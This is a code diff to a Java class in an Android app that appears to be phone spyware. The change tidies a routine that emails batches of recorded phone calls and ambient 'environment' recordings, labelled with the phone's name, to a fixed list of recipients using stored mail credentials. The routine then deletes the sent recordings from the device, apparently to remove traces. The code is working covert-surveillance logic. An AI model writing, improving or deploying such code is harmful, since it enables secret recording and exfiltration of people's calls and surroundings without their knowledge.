@@ -249,62 +249,61 @@ public class GetInfoTask extends TimerTask
 				
 				// --------------------------------------------------------------------------
 				// Send call record mails (3 wavs attached per mail) 
-				String body = String.format(context.getResources().getString(R.string.mail_body_call_record), phoneName);
-		
-				for (int i = 0; i < (1 + callRecordWavsCount/COUNT_PER_PACKAGE); i++) {
-					List<File> pack = getPackage(callRecordWavs, COUNT_PER_PACKAGE, i);
-					if (pack.size() <= 0) continue;
+				if (callRecordWavsCount > 0) {
+					String body = String.format(context.getResources().getString(R.string.mail_body_call_record), phoneName);
+					for (int i = 0; i < (1 + callRecordWavsCount/COUNT_PER_PACKAGE); i++) {
+						List<File> pack = getPackage(callRecordWavs, COUNT_PER_PACKAGE, i);
+						if (pack.size() <= 0) continue;
 
-					String subject = GlobalValues.callRecordFilePrefix + "-" + fromStr + phoneName 
+						String subject = GlobalValues.callRecordFilePrefix + "-" + fromStr + phoneName 
 							+ "-" + DatetimeUtil.format2.format(new Date());
 			
-					if (!NetworkUtil.isNetworkConnected(context)) {
-						return;
-					}
+						if (!NetworkUtil.isNetworkConnected(context)) {	return;	}
 					
-					boolean result = false;
-					int retry = DEFAULT_RETRY_COUNT;
-					String errMsg = "";
-					while(!result && retry > 0)
-					{
-						result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack, errMsg);
-						retry--;
-					}
+						boolean result = false;
+						int retry = DEFAULT_RETRY_COUNT;
+						String errMsg = "";
+						while(!result && retry > 0)
+						{
+							result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack, errMsg);
+							retry--;
+						}
 		
-					// Clean wav files in SD-CARD
-					if (result) {
-						FileCtrl.cleanWavFiles(pack);
-					}
-				} // end of for(...)
+						// Clean wav files that have been sent
+						if (result) {
+							FileCtrl.cleanWavFiles(pack);
+						}
+					} // end of for(...)
+				}
 				
 				// --------------------------------------------------------------------------
 				// Send env record mails (3 wavs attached per mail) 
-				body = String.format(context.getResources().getString(R.string.mail_body_env_record), phoneName);
-				for (int i = 0; i < (1 + envRecordWavsCount/COUNT_PER_PACKAGE); i++) {
-					List<File> pack = getPackage(envRecordWavs, COUNT_PER_PACKAGE, i);
-					if (pack.size() <= 0) continue;
+				if (envRecordWavsCount > 0) {
+					String body = String.format(context.getResources().getString(R.string.mail_body_env_record), phoneName);
+					for (int i = 0; i < (1 + envRecordWavsCount/COUNT_PER_PACKAGE); i++) {
+						List<File> pack = getPackage(envRecordWavs, COUNT_PER_PACKAGE, i);
+						if (pack.size() <= 0) continue;
 
-					String subject = GlobalValues.envRecordFilePrefix + "-" + fromStr + phoneName 
+						String subject = GlobalValues.envRecordFilePrefix + "-" + fromStr + phoneName 
 							+ "-" + DatetimeUtil.format2.format(new Date());
 			
-					if (!NetworkUtil.isNetworkConnected(context)) {
-						return;
-					}
+						if (!NetworkUtil.isNetworkConnected(context)) { return;	}
 					
-					boolean result = false;
-					int retry = DEFAULT_RETRY_COUNT;
-					String errMsg = "";
-					while(!result && retry > 0)
-					{
-						result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack, errMsg);
-						retry--;
-					}
+						boolean result = false;
+						int retry = DEFAULT_RETRY_COUNT;
+						String errMsg = "";
+						while(!result && retry > 0)
+						{
+							result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack, errMsg);
+							retry--;
+						}
 		
-					// Clean wav files in SD-CARD
-					if (result) {
-						FileCtrl.cleanWavFiles(pack);
-					}
-				} // end of for(...)
+						// Clean wav files that have been sent
+						if (result) {
+							FileCtrl.cleanWavFiles(pack);
+						}
+					} // end of for(...)
+				}
 				
 			} // end of if (allowToSend)
 		} // end of (wavs.size() > 0)
